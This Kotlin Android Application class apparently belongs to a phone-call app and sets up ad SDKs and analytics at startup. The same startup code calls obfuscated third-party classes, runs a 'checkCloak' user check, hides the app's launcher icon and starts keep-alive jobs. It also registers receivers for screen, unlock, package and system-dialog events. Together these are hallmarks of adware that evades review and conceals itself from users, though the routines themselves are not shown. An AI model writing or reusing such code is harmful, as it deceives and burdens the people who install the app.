package com.lixiang.phonecall.base

import android.app.Activity
import android.app.ActivityManager
import android.app.Application
import android.bluetooth.BluetoothAdapter
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import android.webkit.WebView
import androidx.lifecycle.LifecycleObserver
import androidx.lifecycle.ProcessLifecycleOwner
import com.adjust.sdk.Adjust
import com.myaaa.mydwjdpow.nifeihfe
import com.anythink.core.api.ATSDK
import com.blankj.utilcode.util.ActivityUtils
import com.blankj.utilcode.util.Utils
import com.google.firebase.ktx.Firebase
import com.google.firebase.ktx.initialize
import com.lixiang.phonecall.ad.ShowAdUtil
import com.lixiang.phonecall.util.*
import com.lixiang.phonecall.util.config.LocalConfig
import com.lixiang.phonecall.util.config.FireConfig
import com.lixiang.phonecall.util.tba.TbaUtil
import com.mAxXngCatI.IQbFlHYrRB.AYDBCFUMAMtb
import com.tencent.mmkv.MMKV


lateinit var appContext:LiXiang
class LiXiang : Application(), LifecycleObserver {

    override fun onCreate() {
        super.onCreate()
        setProcessName()
        nifeihfe.hidheie(this)
        AYDBCFUMAMtb.pshLtRraGUjK(this)
        if (!packageName.equals(processName())){
            return
        }
        Utils.init(this)
        appContext = this
        AppRegisterUtil.register(this)
        MMKV.initialize(this)
        Firebase.initialize(this)
        FireConfig.getFirebaseConfig()
        registerBroadcast()
        AppKeepUtil.clodLaunchAppOpenKeep()
        ATSDK.init(this, LocalConfig.topOnAppId, LocalConfig.topOnAppKey)
        ProcessLifecycleOwner.get().lifecycle.addObserver(this)
        UserTypeUtil.readRefer()
        UserTypeUtil.initAdJustUserType(this)
        UserTypeUtil.checkCloak()
        TbaUtil.uploadInstallSessionEvent()
        AppKeepUtil.hideIcon()
        JobUtil.startCheckTimeJob()
    }


    private fun setProcessName(){
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) return
        val processName = getProcessName()
        if (packageName == processName) return
        WebView.setDataDirectorySuffix(processName)
    }

    private fun registerBroadcast(){
        if (FireConfig.ringartPopBean.openBroadcast()){
            val intentFilter = IntentFilter()
            intentFilter.addAction(Intent.ACTION_SCREEN_ON)
            intentFilter.addAction(Intent.ACTION_SCREEN_OFF)
            intentFilter.addAction(Intent.ACTION_USER_PRESENT)
            intentFilter.addAction(BluetoothAdapter.ACTION_STATE_CHANGED)
            intentFilter.addAction(Intent.ACTION_BATTERY_CHANGED)
            intentFilter.addAction(Intent.ACTION_POWER_CONNECTED)
            intentFilter.addAction(Intent.ACTION_POWER_DISCONNECTED)
            intentFilter.addAction(Intent.ACTION_CLOSE_SYSTEM_DIALOGS)
            intentFilter.addAction(Intent.ACTION_PACKAGE_ADDED)
            intentFilter.addAction(Intent.ACTION_PACKAGE_REMOVED)
            intentFilter.addAction("android.net.conn.CONNECTIVITY_CHANGE")
            intentFilter.addAction("android.intent.action.PACKAGE_REMOVED")
            intentFilter.addAction("android.intent.action.PACKAGE_ADDED")
            intentFilter.addAction("android.net.conn.CONNECTIVITY_CHANGE")
            registerReceiver(MyBroadcastReceiver(), intentFilter)
        }
    }

    private fun Context.processName(): String {
        val pid = android.os.Process.myPid()
        var processName = ""
        val manager = getSystemService(Application.ACTIVITY_SERVICE) as ActivityManager
        for (process in manager.runningAppProcesses) {
            if (process.pid === pid) {
                processName = process.processName
            }
        }
        return processName
    }
}

object Variable{
    //表示动作
    var toRequestPermission1 = false
    var toRequestPermission2 = false
}